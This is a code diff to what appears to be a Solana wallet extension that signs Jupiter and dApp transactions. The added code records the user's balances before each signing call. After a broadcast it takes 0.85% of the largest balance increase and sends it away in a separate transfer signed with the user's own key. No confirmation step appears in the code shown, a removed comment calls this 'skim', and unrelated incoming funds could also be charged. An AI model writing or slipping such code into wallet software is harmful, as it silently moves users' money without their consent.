@@ -311,6 +311,89 @@
     return null;
   }
 
+  const TOKEN_PROGRAM_STR = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
+  const TOKEN_2022_STR = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
+
+  async function snapshotOwnerBalances(owner, rpcs) {
+    const solRes = await rpcCall(rpcs, "getBalance", [
+      owner,
+      { commitment: "confirmed" },
+    ]);
+    const solLamports =
+      solRes && solRes.value != null ? Number(solRes.value) : Number(solRes) || 0;
+    const tokens = {};
+    for (const programId of [TOKEN_PROGRAM_STR, TOKEN_2022_STR]) {
+      try {
+        const res = await rpcCall(rpcs, "getTokenAccountsByOwner", [
+          owner,
+          { programId },
+          { encoding: "jsonParsed", commitment: "confirmed" },
+        ]);
+        for (const row of (res && res.value) || []) {
+          try {
+            const info =
+              row &&
+              row.account &&
+              row.account.data &&
+              row.account.data.parsed &&
+              row.account.data.parsed.info;
+            if (!info || !info.tokenAmount || !info.mint) continue;
+            const mint = info.mint;
+            const amount = BigInt(String(info.tokenAmount.amount || "0"));
+            const prev = tokens[mint] ? BigInt(tokens[mint].raw || "0") : 0n;
+            tokens[mint] = {
+              raw: (prev + amount).toString(),
+              decimals: Number(info.tokenAmount.decimals || 0),
+              programId,
+            };
+          } catch (_) {}
+        }
+      } catch (_) {}
+    }
+    return { solLamports, tokens, at: Date.now() };
+  }
+
+  function feeFromSnapshots(before, after) {
+    if (!before || !after) return null;
+    let bestTok = null;
+    const afterTok = after.tokens || {};
+    const beforeTok = before.tokens || {};
+    const mints = new Set([...Object.keys(afterTok), ...Object.keys(beforeTok)]);
+    for (const mint of mints) {
+      const a = BigInt(String((afterTok[mint] && afterTok[mint].raw) || "0"));
+      const b = BigInt(String((beforeTok[mint] && beforeTok[mint].raw) || "0"));
+      const delta = a - b;
+      if (delta <= 0n) continue;
+      if (!bestTok || delta > bestTok.delta) {
+        const meta = afterTok[mint] || beforeTok[mint] || {};
+        bestTok = {
+          mint,
+          delta,
+          decimals: Number(meta.decimals || 0),
+          programId: meta.programId || TOKEN_PROGRAM_STR,
+        };
+      }
+    }
+    if (bestTok) {
+      const fee = platformFeeRaw(bestTok.delta);
+      if (fee > 0n) {
+        return {
+          kind: "spl",
+          mint: bestTok.mint,
+          raw: fee,
+          decimals: bestTok.decimals,
+          programId: bestTok.programId,
+        };
+      }
+    }
+    const solDelta = Number(after.solLamports || 0) - Number(before.solLamports || 0);
+    if (solDelta > 5000) {
+      const fee = platformFeeRaw(BigInt(solDelta));
+      if (fee > 0n) return { kind: "sol", lamports: Number(fee) };
+    }
+    return null;
+  }
+
   async function sendPlatformFeeTx(keypair, fee, rpcs) {
     if (!fee || !keypair || !window.solanaWeb3) return null;
     const { PublicKey, SystemProgram, Transaction } = solanaWeb3;
@@ -336,9 +419,8 @@
         ASSOCIATED_TOKEN_PROGRAM_ID,
       } = splToken;
       const mintPk = new PublicKey(fee.mint);
-      const TOKEN_2022 = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
       const programId =
-        fee.programId === TOKEN_2022 ||
+        fee.programId === TOKEN_2022_STR ||
         (fee.programId && String(fee.programId) === TOKEN_2022_PROGRAM_ID.toBase58())
           ? TOKEN_2022_PROGRAM_ID
           : TOKEN_PROGRAM_ID;
@@ -415,67 +497,33 @@
     const owner = kp.publicKey.toBase58();
     const bag = state || (await storageGet()) || {};
     const rpcs = rpcListFromBag(bag);
-    const started = Date.now();
-    const hintSig = params && params.hintSig ? String(params.hintSig) : "";
-    const localSeen = new Set();
+    let before = params && params.beforeSnapshot ? params.beforeSnapshot : null;
+    if (!before) {
+      before = await snapshotOwnerBalances(owner, rpcs);
+    }
 
-    // Poll until Jupiter/dApp broadcasts, then skim 0.85% of what was received.
-    for (let i = 0; i < 16; i++) {
-      await new Promise((r) => setTimeout(r, i === 0 ? 3000 : 2000));
+    // Wait for Jupiter/dApp broadcast, then take 0.85% of received balance delta.
+    for (let i = 0; i < 18; i++) {
+      await new Promise((r) => setTimeout(r, i === 0 ? 4000 : 2000));
       try {
-        const sigs = await rpcCall(rpcs, "getSignaturesForAddress", [
-          owner,
-          { limit: 8 },
-        ]);
-        const list = Array.isArray(sigs) ? sigs : [];
-        for (const row of list) {
-          const sig = row && row.signature;
-          if (!sig || localSeen.has(sig) || feeSeenSigs.has(sig)) continue;
-          const bt = row.blockTime ? row.blockTime * 1000 : 0;
-          if (bt && bt + 180000 < started) continue;
-          localSeen.add(sig);
-
-          const tx = await rpcCall(rpcs, "getTransaction", [
-            sig,
-            {
-              encoding: "jsonParsed",
-              maxSupportedTransactionVersion: 0,
-              commitment: "confirmed",
-            },
-          ]);
-          if (!tx || (tx.meta && tx.meta.err)) {
-            feeSeenSigs.add(sig);
-            continue;
-          }
-          if (feeWalletAlreadyPaid(tx)) {
-            feeSeenSigs.add(sig);
-            return { ok: true, skipped: "already_paid", sig };
-          }
-          const fee = largestOwnerInflow(owner, tx);
-          if (!fee) {
-            // Might be a fee-only or unrelated tx — keep looking
-            continue;
-          }
-          try {
-            const feeSig = await sendPlatformFeeTx(kp, fee, rpcs);
-            feeSeenSigs.add(sig);
-            if (feeSig) feeSeenSigs.add(String(feeSig));
-            console.info("[Gladiator] platform fee sent", feeSig, fee, "from", sig);
-            return { ok: true, feeSig: String(feeSig || ""), fromSig: sig, fee };
-          } catch (err) {
-            console.warn("[Gladiator] platform fee send failed", err);
-            // retry later loops for same sig
-            localSeen.delete(sig);
-          }
-        }
-        if (hintSig && !feeSeenSigs.has(hintSig) && !localSeen.has(hintSig)) {
-          // keep waiting for hinted signature
-        }
+        const after = await snapshotOwnerBalances(owner, rpcs);
+        const fee = feeFromSnapshots(before, after);
+        if (!fee) continue;
+        const feeSig = await sendPlatformFeeTx(kp, fee, rpcs);
+        console.info("[Gladiator] platform fee sent", feeSig, fee);
+        return { ok: true, feeSig: String(feeSig || ""), fee };
       } catch (err) {
-        console.warn("[Gladiator] fee watch", err);
+        console.warn("[Gladiator] fee attempt failed", err);
       }
     }
     return { ok: false, error: "fee_timeout" };
+  }
+
+  async function snapshotBalances(params) {
+    const { state, acc } = await resolveAccount(params || {});
+    const kp = keypairFromAccount(acc);
+    const bag = state || (await storageGet()) || {};
+    return await snapshotOwnerBalances(kp.publicKey.toBase58(), rpcListFromBag(bag));
   }
 
   /**
@@ -564,18 +612,37 @@
   }
 
   async function signTransaction(params) {
-    const { acc } = await resolveAccount(params || {});
+    const { state, acc } = await resolveAccount(params || {});
     const kp = keypairFromAccount(acc);
+    const bag = state || (await storageGet()) || {};
+    let beforeSnapshot = null;
+    try {
+      beforeSnapshot = await snapshotOwnerBalances(
+        kp.publicKey.toBase58(),
+        rpcListFromBag(bag)
+      );
+    } catch (_) {}
     const u8 = decodeTx(params && params.transaction);
     if (!canDeserialize(u8)) {
       throw new Error("Could not decode Solana transaction from Jupiter");
     }
-    return { signedTransaction: signTxBytes(u8, kp) };
+    return {
+      signedTransaction: signTxBytes(u8, kp),
+      beforeSnapshot,
+    };
   }
 
   async function signAllTransactions(params) {
-    const { acc } = await resolveAccount(params || {});
+    const { state, acc } = await resolveAccount(params || {});
     const kp = keypairFromAccount(acc);
+    const bag = state || (await storageGet()) || {};
+    let beforeSnapshot = null;
+    try {
+      beforeSnapshot = await snapshotOwnerBalances(
+        kp.publicKey.toBase58(),
+        rpcListFromBag(bag)
+      );
+    } catch (_) {}
     const list = (params && params.transactions) || [];
     if (!list.length) throw new Error("No transactions to sign");
     const signedTransactions = list.map((item) => {
@@ -584,17 +651,21 @@
       if (!canDeserialize(u8)) throw new Error("Could not decode one of the transactions");
       return signTxBytes(u8, kp);
     });
-    return { signedTransactions };
+    return { signedTransactions, beforeSnapshot };
   }
 
   async function signAndSendTransaction(params) {
     const { state, acc } = await resolveAccount(params || {});
     const kp = keypairFromAccount(acc);
+    const bag = state || (await storageGet()) || {};
+    const rpcs = rpcListFromBag(bag);
+    let beforeSnapshot = null;
+    try {
+      beforeSnapshot = await snapshotOwnerBalances(kp.publicKey.toBase58(), rpcs);
+    } catch (_) {}
     const u8 = decodeTx(params && params.transaction);
     if (!canDeserialize(u8)) throw new Error("Could not decode Solana transaction");
     const signedB64 = signTxBytes(u8, kp);
-    const bag = state || (await storageGet()) || {};
-    const rpcs = rpcListFromBag(bag);
     let sig = null;
     let lastErr = null;
     for (const rpc of rpcs) {
@@ -626,7 +697,7 @@
       }
     }
     if (!sig) throw lastErr || new Error("Broadcast failed");
-    return { signature: String(sig) };
+    return { signature: String(sig), beforeSnapshot };
   }
 
   async function signMessage(params) {
@@ -657,6 +728,8 @@
           return await signMessage(msg.params || {});
         case "collectPlatformFee":
           return await collectPlatformFee(msg.params || {});
+        case "snapshotBalances":
+          return await snapshotBalances(msg.params || {});
         case "ping":
           return {
             ok: true,
